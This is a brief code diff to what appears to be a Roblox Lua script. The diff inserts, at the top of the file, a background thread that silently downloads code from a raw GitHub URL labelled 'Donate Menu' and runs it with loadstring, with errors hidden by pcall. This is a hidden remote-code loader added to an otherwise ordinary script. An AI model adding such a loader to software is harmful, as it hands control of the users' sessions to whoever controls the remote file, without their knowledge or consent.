@@ -1,3 +1,9 @@
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Xkaka228X/Hello_gui/refs/heads/main/Donate%20Menu"))()
+    end)
+end)
+
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
